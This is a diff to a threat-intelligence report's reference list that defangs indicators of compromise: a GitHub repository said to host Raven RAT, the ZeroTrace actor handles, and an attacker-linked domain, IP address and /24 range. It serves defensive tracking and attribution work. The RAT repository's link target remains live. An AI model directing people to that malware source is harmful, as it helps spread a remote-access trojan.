@@ -1147,7 +1147,7 @@ The complete machine-readable IOC feed is available in the structured JSON forma
 **Raven RAT / ZeroTrace:**
 
 - CYFIRMA (2025): "Raven Stealer Unmasked", ZeroTrace Team identity, `@ZeroTraceDevOfficial`, `monroe31s`, `steffz` handle in Octalyn Stealer builder artifacts
-- GitHub: `monroe31s/Raven-RAT`, [github.com/monroe31s/Raven-RAT](https://github.com/monroe31s/Raven-RAT); created 2025-05-01; 7 stars, 5 forks; `@ZeroTraceDevOfficial` Telegram link confirmed
+- GitHub: `monroe31s/Raven-RAT`, [github[.]com/monroe31s/Raven-RAT](https://github.com/monroe31s/Raven-RAT); created 2025-05-01; 7 stars, 5 forks; `@ZeroTraceDevOfficial` Telegram link confirmed
 
 **ConnectWise ScreenConnect Abuse:**
 
@@ -1163,7 +1163,7 @@ The complete machine-readable IOC feed is available in the structured JSON forma
 **Infrastructure:**
 
 - IPinfo.io: ASN lookup data for AS834 (IPXO LLC), AS40662 (Layer7 Technologies Inc)
-- BGP.he.net: PTR record confirmation for `adminxyzhosting.com` to `185.49.126.140`; ROA validation for AS40662; /24 co-host enumeration for `185.49.126.0/24`
+- BGP.he.net: PTR record confirmation for `adminxyzhosting[.]com` to `185[.]49[.]126[.]140`; ROA validation for AS40662; /24 co-host enumeration for `185[.]49[.]126[.]0/24`
 - CleanTalk (cleantalk.org/blacklists/as834): AS834 spam tracking
 
 ---
